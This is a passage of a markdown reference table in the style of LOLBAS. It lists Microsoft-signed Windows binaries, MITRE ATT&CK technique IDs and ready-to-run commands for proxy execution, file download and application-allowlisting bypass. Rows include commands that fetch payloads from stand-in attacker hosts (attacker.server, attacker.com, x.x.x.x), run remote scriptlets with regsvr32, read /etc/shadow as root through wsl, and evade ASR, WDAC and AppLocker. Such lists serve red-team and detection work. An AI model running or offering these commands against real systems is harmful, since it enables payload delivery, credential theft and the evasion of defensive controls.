| **`AgentExecutor.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `AgentExecutor.exe -powershell "c:\temp\malicious.ps1" "c:\temp\test.log" "c:\temp\test1.log" "c:\temp\test2.log" 60000 "C:\Windows\SysWOW64\WindowsPowerShell\v1.0" 0 1` | Execute unsigned powershell scripts |
| **`AgentExecutor.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `AgentExecutor.exe -powershell "c:\temp\malicious.ps1" "c:\temp\test.log" "c:\temp\test1.log" "c:\temp\test2.log" 60000 "C:\temp\" 0 1` | Execute a provided EXE |
| **`AppCert.exe`** (`OtherMSBinaries`) | `T1127` | `Administrator` | `appcert.exe test -apptype desktop -setuppath c:\windows\system32\notepad.exe -reportoutputpath c:\users\public\output.xml` | Performs execution of specified file, can be used as a defense evasion |
| **`AppCert.exe`** (`OtherMSBinaries`) | `T1218.007` | `Administrator` | `appcert.exe test -apptype desktop -setuppath c:\users\public\malicious.msi -setupcommandline /q -reportoutputpath c:\users\public\output.xml` | Execute custom made MSI file with malicious code |
| **`Appvlp.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `AppVLP.exe \\webdav\calc.bat` | Execution of BAT file hosted on Webdav server. |
| **`Appvlp.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"` | Local execution of process bypassing Attack Surface Reduction (ASR). |
| **`Appvlp.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"` | Local execution of process bypassing Attack Surface Reduction (ASR). |
| **`Bginfo.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `bginfo.exe bginfo.bgi /popup /nolicprompt` | Local execution of VBScript |
| **`Bginfo.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt` | Remote execution of VBScript |
| **`Bginfo.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `\\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt` | Remote execution of VBScript |
| **`Cdb.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `cdb.exe -cf x64_calc.wds -o notepad.exe` | Local execution of assembly shellcode. |
| **`Cdb.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `cdb.exe -pd -pn <process_name> .shell <cmd>` | Run a shell command under a trusted Microsoft signed binary |
| **`Cdb.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `cdb.exe -c C:\debug-script.txt calc` | Run commands under a trusted Microsoft signed binary |
| **`coregen.exe`** (`OtherMSBinaries`) | `T1055` | `User` | `coregen.exe /L C:\folder\evil.dll dummy_assembly_name` | Execute DLL code |
| **`coregen.exe`** (`OtherMSBinaries`) | `T1055` | `User` | `coregen.exe dummy_assembly_name` | Execute DLL code |
| **`csi.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `csi.exe file` | Local execution of unsigned C# code. |
| **`DefaultPack.EXE`** (`OtherMSBinaries`) | `T1218` | `User` | `DefaultPack.EXE /C:"process.exe args"` | Can be used to execute stagers, binaries, and other malicious commands. |
| **`Devinit.exe`** (`OtherMSBinaries`) | `T1218.007` | `User` | `devinit.exe run -t msi-install -i https://example.com/out.msi` | Executes code from a (remote) MSI file. |
| **`Devtoolslauncher.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] "argument here" test` | Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary. https://i.imgur.com/Go7rc0I.png |
| **`Devtoolslauncher.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `devtoolslauncher.exe LaunchForDebug [PATH_TO_BIN] "argument here" test` | Execute any binary with given arguments. |
| **`dnx.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `dnx.exe consoleapp` | Local execution of C# project stored in consoleapp folder. |
| **`Dotnet.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `dotnet.exe [PATH_TO_DLL]` | Execute DLL |
| **`Dotnet.exe`** (`OtherMSBinaries`) | `T1059` | `User` | `dotnet.exe fsi` | Execute arbitrary F# code |
| **`Dxcap.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `Dxcap.exe -c C:\Windows\System32\notepad.exe` | Local execution of a process as a subprocess of dxcap.exe |
| **`Mftrace.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `Mftrace.exe cmd.exe` | Local execution of cmd.exe as a subprocess of Mftrace.exe. |
| **`Mftrace.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `Mftrace.exe powershell.exe` | Local execution of powershell.exe as a subprocess of Mftrace.exe. |
| **`Microsoft.NodejsTools.PressAnyKey.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `Microsoft.NodejsTools.PressAnyKey.exe normal 1 cmd.exe` | Spawn a new process via Microsoft.NodejsTools.PressAnyKey.exe. |
| **`Msdeploy.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\temp\calc.bat"` | Local execution of batch file using msdeploy.exe. |
| **`msxsl.exe`** (`OtherMSBinaries`) | `T1220` | `User` | `msxsl.exe customers.xml script.xsl` | Local execution of script stored in XSL file. |
| **`msxsl.exe`** (`OtherMSBinaries`) | `T1220` | `User` | `msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml` | Local execution of remote script stored in XSL script stored as an XML file. |
| **`OpenConsole.exe`** (`OtherMSBinaries`) | `T1202` | `User` | `OpenConsole.exe calc` | Use OpenConsole.exe as a proxy binary to evade defensive counter-measures |
| **`Procdump.exe`** (`OtherMSBinaries`) | `T1202` | `User` | `procdump.exe -md calc.dll explorer.exe` | Performs execution of unsigned DLL. |
| **`Procdump.exe`** (`OtherMSBinaries`) | `T1202` | `User` | `procdump.exe -md calc.dll foobar` | Performs execution of unsigned DLL. |
| **`rcsi.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `rcsi.exe bypass.csx` | Local execution of arbitrary C# code stored in local CSX file. |
| **`Remote.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `Remote.exe /s "powershell.exe" anythinghere` | Executes a process under a trusted Microsoft signed binary |
| **`Remote.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `Remote.exe /s "\\10.10.10.30\binaries\file.exe" anythinghere` | Executing a remote binary without saving file to disk |
| **`Sqlps.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Sqlps.exe -noprofile` | Execute PowerShell commands without ScriptBlock logging. |
| **`SQLToolsPS.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `SQLToolsPS.exe -noprofile -command Start-Process calc.exe` | Execute PowerShell command. |
| **`Squirrel.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `squirrel.exe --update [url to package]` | Download and execute binary |
| **`Squirrel.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `squirrel.exe --updateRollback=[url to package]` | Download and execute binary |
| **`te.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `te.exe bypass.wsc` | Execute Visual Basic script stored in local Windows Script Component file. |
| **`te.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `te.exe test.dll` | Execute DLL file. |
| **`Teams.exe`** (`OtherMSBinaries`) | `T1218.015` | `User` | `teams.exe` | Execute JavaScript code |
| **`Teams.exe`** (`OtherMSBinaries`) | `T1218.015` | `User` | `teams.exe` | Execute JavaScript code |
| **`Teams.exe`** (`OtherMSBinaries`) | `T1218.015` | `User` | `teams.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c ping google.com &&"` | Executes a process under a trusted Microsoft signed binary |
| **`Tracker.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `Tracker.exe /d .\calc.dll /c C:\Windows\write.exe` | Injection of locally stored DLL file into target process. |
| **`Update.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Update.exe --update=[url to package]` | Download and execute binary |
| **`Update.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Update.exe --update=\\remoteserver\payloadFolder` | Download and execute binary |
| **`Update.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Update.exe --updateRollback=[url to package]` | Download and execute binary |
| **`Update.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Update.exe --updateRollback=\\remoteserver\payloadFolder` | Download and execute binary |
| **`Update.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Update.exe --processStart payload.exe --process-start-args "whatever args"` | Execute binary |
| **`Update.exe`** (`OtherMSBinaries`) | `T1547` | `User` | `Update.exe --createShortcut=payload.exe -l=Startup` | Execute binary |
| **`Update.exe`** (`OtherMSBinaries`) | `T1070` | `User` | `Update.exe --removeShortcut=payload.exe -l=Startup` | Execute binary |
| **`VSDiagnostics.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `VSDiagnostics.exe start 1 /launch:calc.exe` | Proxy execution of binary |
| **`VSDiagnostics.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `VSDiagnostics.exe start 2 /launch:cmd.exe /launchArgs:"/c calc.exe"` | Proxy execution of binary with arguments |
| **`VSIISExeLauncher.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `VSIISExeLauncher.exe -p [PATH_TO_BIN] -a "argument here"` | Execute any binary with given arguments. |
| **`Vshadow.exe`** (`OtherMSBinaries`) | `T1127` | `Administrator` | `vshadow.exe -nw -exec=c:\windows\system32\calc.exe C:` | Performs execution of specified executable file. |
| **`vsjitdebugger.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `Vsjitdebugger.exe calc.exe` | Execution of local PE file as a subprocess of Vsjitdebugger.exe. |
| **`Wsl.exe`** (`OtherMSBinaries`) | `T1202` | `User` | `wsl.exe -e /mnt/c/Windows/System32/calc.exe` | Performs execution of specified file, can be used to execute arbitrary Linux commands. |
| **`Wsl.exe`** (`OtherMSBinaries`) | `T1202` | `User` | `wsl.exe -u root -e cat /etc/shadow` | Performs execution of arbitrary Linux commands as root without need for password. |
| **`Wsl.exe`** (`OtherMSBinaries`) | `T1202` | `User` | `wsl.exe --exec bash -c 'cat file'` | Performs execution of arbitrary Linux commands. |
| **`Wsl.exe`** (`OtherMSBinaries`) | `T1202` | `User` | `wsl.exe --system calc.exe` | Performs execution of arbitrary Linux commands as root without need for password. |
| **`vsls-agent.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `vsls-agent.exe --agentExtensionPath c:\path\to\payload.dll` | Execute proxied payload with Microsoft signed binary |
| **`code.exe`** (`HonorableMentions`) | `T1219` | `User` | `code.exe tunnel --accept-server-license-terms --name "tunnel-name"` | Reverse PowerShell session over MS provided infrastructure. |

## Category: `Download` (51 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`AppInstaller.exe`** (`OSBinaries`) | `T1105` | `User` | `start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw` | Download file from Internet |
| **`Bitsadmin.exe`** (`OSBinaries`) | `T1105` | `User` | `bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1` | Download file from Internet |
| **`CertOC.exe`** (`OSBinaries`) | `T1105` | `User` | `certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1` | Download scripts, webshells etc. |
| **`CertReq.exe`** (`OSBinaries`) | `T1105` | `User` | `CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt` | Download file from Internet |
| **`Certutil.exe`** (`OSBinaries`) | `T1105` | `User` | `certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe` | Download file from Internet |
| **`Certutil.exe`** (`OSBinaries`) | `T1105` | `User` | `certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe` | Download file from Internet |
| **`Cmd.exe`** (`OSBinaries`) | `T1105` | `User` | `type \\webdav-server\folder\file.ext > C:\Path\file.ext` | Download/copy a file from a WebDAV server |
| **`cmdl32.exe`** (`OSBinaries`) | `T1105` | `User` | `cmdl32 /vpn /lan %cd%\config` | Download file from Internet |
| **`ConfigSecurityPolicy.exe`** (`OSBinaries`) | `T1105` | `User` | `ConfigSecurityPolicy.exe https://example.com/payload` | Downloads payload from remote server |
| **`Desktopimgdownldr.exe`** (`OSBinaries`) | `T1105` | `User` | `set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr` | Download arbitrary files from a web server |
| **`Diantz.exe`** (`OSBinaries`) | `T1105` | `User` | `diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab` | Download and compress into a cab file. |
| **`Esentutl.exe`** (`OSBinaries`) | `T1564.004` | `User` | `esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o` | Use to copy files from one unc path to another |
| **`Expand.exe`** (`OSBinaries`) | `T1105` | `User` | `expand \\webdav\folder\file.bat c:\ADS\file.bat` | Use to copies the source file to the destination file |
| **`Extrac32.exe`** (`OSBinaries`) | `T1105` | `User` | `extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt` | Download file from UNC/WEBDav |
| **`Findstr.exe`** (`OSBinaries`) | `T1105` | `User` | `findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.exe` | Download/Copy file from webdav server |
| **`Finger.exe`** (`OSBinaries`) | `T1105` | `User` | `finger user@example.host.com \| more +2 \| cmd` | Download malicious payload |
| **`Ftp.exe`** (`OSBinaries`) | `T1105` | `User` | `cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"` | Spawn new process using ftp.exe. Ftp.exe downloads the binary. |
| **`Hh.exe`** (`OSBinaries`) | `T1105` | `User` | `HH.exe http://some.url/script.ps1` | Download files from url |
| **`IMEWDBLD.exe`** (`OSBinaries`) | `T1105` | `User` | `C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw` | Download file from Internet |
| **`Ieexec.exe`** (`OSBinaries`) | `T1105` | `User` | `ieexec.exe http://x.x.x.x:8080/bypass.exe` | Download and run attacker code from remote location |
| **`Installutil.exe`** (`OSBinaries`) | `T1105` | `User` | `InstallUtil.exe https://example.com/payload` | Downloads payload from remote server |
| **`Ldifde.exe`** (`OSBinaries`) | `T1105` | `Administrator` | `Ldifde -i -f inputfile.ldf` | Download file from Internet |
| **`Makecab.exe`** (`OSBinaries`) | `T1105` | `User` | `makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab` | Download file and compress into a cab file |
| **`MpCmdRun.exe`** (`OSBinaries`) | `T1105` | `User` | `MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe` | Download file |
| **`MpCmdRun.exe`** (`OSBinaries`) | `T1105` | `User` | `copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url https://attacker.server/beacon.exe -path C:\Users\Public\Downloads\evil.exe` | Download file |
| **`Msedge.exe`** (`OSBinaries`) | `T1105` | `User` | `msedge.exe https://example.com/file.exe.txt` | Download file from the internet |
| **`Msedge.exe`** (`OSBinaries`) | `T1105` | `User` | `msedge.exe --headless --enable-logging --disable-gpu --dump-dom "http://example.com/evil.b64.html" > out.b64` | Download file from the internet |
| **`Mshta.exe`** (`OSBinaries`) | `T1105` | `User` | `mshta.exe https://example.com/payload` | Downloads payload from remote server |
| **`OneDriveStandaloneUpdater.exe`** (`OSBinaries`) | `T1105` | `User` | `OneDriveStandaloneUpdater` | Download a file from the Internet without executing any anomalous executables with suspicious arguments |
| **`Presentationhost.exe`** (`OSBinaries`) | `T1105` | `User` | `Presentationhost.exe https://example.com/payload` | Downloads payload from remote server |
| **`PrintBrm.exe`** (`OSBinaries`) | `T1105` | `User` | `PrintBrm -b -d \\1.2.3.4\share\example_folder -f C:\Users\user\Desktop\new.zip` | Exfiltrate the contents of a remote folder on a UNC share into a zip file |
| **`Replace.exe`** (`OSBinaries`) | `T1105` | `User` | `replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A` | Download file |
| **`Xwizard.exe`** (`OSBinaries`) | `T1105` | `User` | `xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM` | Download file from Internet |
| **`msedge_proxy.exe`** (`OSBinaries`) | `T1105` | `User` | `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe http://example.com/test.zip` | Download file from the internet |
| **`msedge_proxy.exe`** (`OSBinaries`) | `T1105` | `User` | `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="C:\\Windows\\System32\\cmd.exe /c curl ipinfo.io/json --output %USERPROFILE%\\Desktop\\test.json &&"` | Download file from the internet |
| **`Scrobj.dll`** (`OSLibraries`) | `T1105` | `User` | `rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib http://x.x.x.x/payload.exe` | Download file from remote location. |
| **`Shimgvw.dll`** (`OSLibraries`) | `T1105` | `User` | `rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen http://x.x.x.x/payload.exe` | Download file from remote location. |
| **`Excel.exe`** (`OtherMSBinaries`) | `T1105` | `User` | `Excel.exe http://192.168.1.10/TeamsAddinLoader.dll` | It will download a remote payload and place it in INetCache. |
| **`MSAccess.exe`** (`OtherMSBinaries`) | `T1105` | `User` | `MSAccess.exe https://example.com/payload.exe.mdb` | It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache. |
| **`MsoHtmEd.exe`** (`OtherMSBinaries`) | `T1105` | `User` | `MsoHtmEd.exe https://example.com/payload` | It will download a remote payload and place it in INetCache. |
| **`Mspub.exe`** (`OtherMSBinaries`) | `T1105` | `User` | `mspub.exe https://example.com/payload` | It will download a remote payload and place it in INetCache. |
| **`msxsl.exe`** (`OtherMSBinaries`) | `T1105` | `User` | `msxsl.exe https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl -o <filename>` | Download a file from the internet and save it to disk. |
| **`Powerpnt.exe`** (`OtherMSBinaries`) | `T1105` | `User` | `Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"` | It will download a remote payload and place it in INetCache. |
| **`ProtocolHandler.exe`** (`OtherMSBinaries`) | `T1105` | `User` | `ProtocolHandler.exe https://example.com/payload` | It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction) |
| **`Squirrel.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `squirrel.exe --download [url to package]` | Download binary |
| **`Update.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Update.exe --download [url to package]` | Download binary |
| **`WinProj.exe`** (`OtherMSBinaries`) | `T1105` | `User` | `WinProj.exe https://example.com/payload` | It will download a remote payload and place it in INetCache. |
| **`Winword.exe`** (`OtherMSBinaries`) | `T1105` | `User` | `winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"` | It will download a remote payload and place it in INetCache. |
| **`Wsl.exe`** (`OtherMSBinaries`) | `T1202` | `User` | `wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'` | Download file |
| **`devtunnel.exe`** (`OtherMSBinaries`) | `T1105` | `User` | `devtunnel.exe host -p 8080` | Download Files, Upload Files, Data Exfiltration |
| **`GfxDownloadWrapper.exe`** (`HonorableMentions`) | `T1105` | `User` | `C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"` | Download file from internet |

## Category: `AWL Bypass` (48 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`Aspnet_Compiler.exe`** (`OSBinaries`) | `T1127` | `User` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u` | Execute proxied payload with Microsoft signed binary to bypass application control solutions |
| **`Bash.exe`** (`OSBinaries`) | `T1202` | `User` | `bash.exe -c calc.exe` | Performs execution of specified file, can be used to bypass Application Whitelisting. |
| **`Cmstp.exe`** (`OSBinaries`) | `T1218.003` | `User` | `cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf` | Execute code hidden within an inf file. Execute code directly from Internet. |
| **`Dfsvc.exe`** (`OSBinaries`) | `T1127` | `User` | `rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo` | Use binary to bypass Application whitelisting |
| **`Installutil.exe`** (`OSBinaries`) | `T1218.004` | `User` | `InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll` | Use to execute code and bypass application whitelisting |
| **`Microsoft.Workflow.Compiler.exe`** (`OSBinaries`) | `T1127` | `User` | `Microsoft.Workflow.Compiler.exe tests.txt results.txt` | Compile and run code |
| **`Msbuild.exe`** (`OSBinaries`) | `T1127.001` | `User` | `msbuild.exe pshell.xml` | Compile and run code |
| **`Msdt.exe`** (`OSBinaries`) | `T1218` | `User` | `msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE` | Execute code bypass Application whitelisting |
| **`Msdt.exe`** (`OSBinaries`) | `T1202` | `User` | `msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"` | Execute code bypass Application allowlisting |
| **`Regasm.exe`** (`OSBinaries`) | `T1218.009` | `Local Admin` | `regasm.exe AllTheThingsx64.dll` | Execute code and bypass Application whitelisting |
| **`Regsvcs.exe`** (`OSBinaries`) | `T1218.009` | `Local Admin` | `regsvcs.exe AllTheThingsx64.dll` | Execute dll file and bypass Application whitelisting |
| **`Regsvr32.exe`** (`OSBinaries`) | `T1218.010` | `User` | `regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll` | Execute code from remote scriptlet, bypass Application whitelisting |
| **`Regsvr32.exe`** (`OSBinaries`) | `T1218.010` | `User` | `regsvr32.exe /s /u /i:file.sct scrobj.dll` | Execute code from scriptlet, bypass Application whitelisting |
| **`winrm.vbs`** (`OSScripts`) | `T1220` | `User` | `%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty` | Execute arbitrary, unsigned code via XSL script |
| **`Advpack.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,` | Run local or remote script(let) code through INF file specification. |
| **`Advpack.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,,1,` | Run local or remote script(let) code through INF file specification. |
| **`Dfshim.dll`** (`OSLibraries`) | `T1127` | `User` | `rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo` | Use binary to bypass Application whitelisting |
| **`Ieadvpack.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe ieadvpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,` | Run local or remote script(let) code through INF file specification. |
| **`Ieadvpack.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe ieadvpack.dll,LaunchINFSection c:\test.inf,,1,` | Run local or remote script(let) code through INF file specification. |
| **`Setupapi.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Tools\shady.inf` | Run local or remote script(let) code through INF file specification. |
| **`Syssetup.dll`** (`OSLibraries`) | `T1218.011` | `User` | `rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\test\shady.inf` | Run local or remote script(let) code through INF file specification (Note May pop an error window). |
| **`AccCheckConsole.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `AccCheckConsole.exe -window "Untitled - Notepad" C:\path\to\your\lolbas.dll` | Local execution of managed code to bypass AppLocker. |
| **`Bginfo.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `bginfo.exe bginfo.bgi /popup /nolicprompt` | Local execution of VBScript |
| **`Bginfo.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt` | Remote execution of VBScript |
| **`Bginfo.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `\\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt` | Remote execution of VBScript |
| **`coregen.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `coregen.exe /L C:\folder\evil.dll dummy_assembly_name` | Execute DLL code |
| **`Dotnet.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `dotnet.exe [PATH_TO_DLL]` | Execute code bypassing AWL |
| **`Dotnet.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `dotnet.exe msbuild [Path_TO_XML_CSPROJ]` | Execute code bypassing AWL |
| **`Fsi.exe`** (`OtherMSBinaries`) | `T1059` | `User` | `fsi.exe c:\path\to\test.fsscript` | Execute payload with Microsoft signed binary to bypass WDAC policies |
| **`Fsi.exe`** (`OtherMSBinaries`) | `T1059` | `User` | `fsi.exe` | Execute payload with Microsoft signed binary to bypass WDAC policies |
| **`FsiAnyCpu.exe`** (`OtherMSBinaries`) | `T1059` | `User` | `fsianycpu.exe c:\path\to\test.fsscript` | Execute payload with Microsoft signed binary to bypass WDAC policies |
| **`FsiAnyCpu.exe`** (`OtherMSBinaries`) | `T1059` | `User` | `fsianycpu.exe` | Execute payload with Microsoft signed binary to bypass WDAC policies |
| **`Msdeploy.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\temp\calc.bat"` | Local execution of batch file using msdeploy.exe. |
| **`msxsl.exe`** (`OtherMSBinaries`) | `T1220` | `User` | `msxsl.exe customers.xml script.xsl` | Local execution of script stored in XSL file. |
| **`msxsl.exe`** (`OtherMSBinaries`) | `T1220` | `User` | `msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml` | Local execution of remote script stored in XSL script stored as an XML file. |
| **`rcsi.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `rcsi.exe bypass.csx` | Local execution of arbitrary C# code stored in local CSX file. |
| **`Remote.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `Remote.exe /s "powershell.exe" anythinghere` | Executes a process under a trusted Microsoft signed binary |
| **`Squirrel.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `squirrel.exe --update [url to package]` | Download and execute binary |
| **`Squirrel.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `squirrel.exe --updateRoolback=[url to package]` | Download and execute binary |
| **`Tracker.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `Tracker.exe /d .\calc.dll /c C:\Windows\write.exe` | Injection of locally stored DLL file into target process. |
| **`Update.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Update.exe --update=[url to package]` | Download and execute binary |
| **`Update.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Update.exe --update=\\remoteserver\payloadFolder` | Download and execute binary |
| **`Update.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Update.exe --updateRollback=[url to package]` | Download and execute binary |
| **`Update.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Update.exe --processStart payload.exe --process-start-args "whatever args"` | Application Whitelisting Bypass |
| **`Update.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `Update.exe --updateRollback=\\remoteserver\payloadFolder` | Download and execute binary |
| **`VisualUiaVerifyNative.exe`** (`OtherMSBinaries`) | `T1218` | `User` | `VisualUiaVerifyNative.exe` | Execute proxied payload with Microsoft signed binary to bypass WDAC policies |
| **`Wfc.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `wfc.exe c:\path\to\test.xoml` | Execute proxied payload with Microsoft signed binary to bypass WDAC policies |
| **`vstest.console.exe`** (`OtherMSBinaries`) | `T1127` | `User` | `vstest.console.exe testcode.dll` | Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe |

## Category: `ADS` (36 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
